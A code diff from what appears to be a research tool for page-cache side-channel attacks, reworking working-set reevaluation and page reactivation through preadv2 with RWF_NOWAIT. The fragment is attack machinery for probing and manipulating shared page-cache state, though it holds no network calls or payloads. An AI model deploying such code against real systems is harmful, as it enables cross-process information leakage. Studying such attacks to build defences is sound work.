@@ -663,23 +663,26 @@ int fcaStart(Attack *attack, int flags)
         DEBUG_PRINT((DEBUG BS_TAG OK "Spawning blocking set manager thread...\n"));
     }
 
-    // reevaluate working set after blocking memory
-    if (attack->use_attack_bs_ && attack->use_attack_ws_)
+    if (attack->use_attack_ws_)
     {
+        // reevaluate working set after blocking memory
         // wait a bit until ws is reestablished
-        osal_sleep_us(3000000);
-        
-        DEBUG_PRINT((DEBUG WS_TAG INFO "Reevaluating working set...\n"));
-        if (reevaluateWorkingSet(attack) != 0)
+        if(attack->use_attack_bs_)
         {
-            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at reevaluateWorkingSet...\n", OSAL_EC));
-            goto error;
+            osal_sleep_us(3000000);
+            
+            DEBUG_PRINT((DEBUG WS_TAG INFO "Reevaluating working set...\n"));
+            if (reevaluateWorkingSet(attack) != 0)
+            {
+                DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at reevaluateWorkingSet...\n", OSAL_EC));
+                goto error;
+            }
+            attack->working_set_.up_to_date_list_set_ ^= 1;
+            DEBUG_PRINT((DEBUG WS_TAG OK "Reevaluating working set...\n"));
+            DEBUG_PRINT((DEBUG WS_TAG INFO "Reevaluated working set consists of %zu files (%zu bytes mapped).\n",
+                    attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_,
+                    attack->working_set_.mem_in_ws_[attack->working_set_.up_to_date_list_set_]));
         }
-        attack->working_set_.up_to_date_list_set_ ^= 1;
-        DEBUG_PRINT((DEBUG WS_TAG OK "Reevaluating working set...\n"));
-        DEBUG_PRINT((DEBUG WS_TAG INFO "Reevaluated working set consists of %zu files (%zu bytes mapped).\n",
-                attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_,
-                attack->working_set_.mem_in_ws_[attack->working_set_.up_to_date_list_set_]));
 
         /*unsigned char choice = 0;
         while(choice != 'q')
@@ -1409,7 +1412,6 @@ int targetsEvictedEsThreadsFn(void *arg)
 
     // did not work -> to aggressive?
     //if(pthread_mutex_trylock(&attack->eviction_set_.workers_targets_check_lock_) == 0)
-    
     if(pthread_mutex_lock(&attack->eviction_set_.workers_targets_check_lock_) == 0)
     {
         // we have the lock check
@@ -2484,13 +2486,8 @@ size_t activateWS(ListNode *resident_files_start, size_t resident_files_count, A
             // start in middle of window and work way out
             for (size_t p = page_sequences[s].offset_; p < page_sequences[s].offset_ + page_sequences[s].length_; p++)
             {
-                // trigger potential readahead by accessing page in middle of readahead window
-                /*if (p % attack->fa_window_size_pages_ == 0)
-                {
-                    fileMappingActivate(&current_cached_file->mapping_, (page_sequences[s].offset_ + p + attack->fa_window_size_pages_ / 2) * PAGE_SIZE, attack->working_set_.use_file_api_);
-                }*/
-                // activate
-                fileMappingActivate(&current_cached_file->mapping_, p * PAGE_SIZE, attack->working_set_.use_file_api_);
+                // reactivate without readahead
+                fileMappingReactivate(&current_cached_file->mapping_, p * PAGE_SIZE);
                 accessed_pages++;
             }
 #elif defined(_WIN32)
@@ -2990,11 +2987,13 @@ inline void fileMappingReactivate(FileMapping *mapping, size_t offset)
         .iov_len = 1
     };
 
+    // do not fetch data which is not in page cache anymore
+    // only try to protect working set
     if (preadv2(mapping->internal_.fd_, &iov, 1, offset, RWF_NOWAIT) != 1 ||
         preadv2(mapping->internal_.fd_, &iov, 1, offset, RWF_NOWAIT) != 1 ||
         preadv2(mapping->internal_.fd_, &iov, 1, offset, RWF_NOWAIT) != 1)
     {
-        DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at pread...\n", OSAL_EC));
+        DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at preadv2...\n", OSAL_EC));
     }
 #elif defined(_WIN32)
         // TODO implement
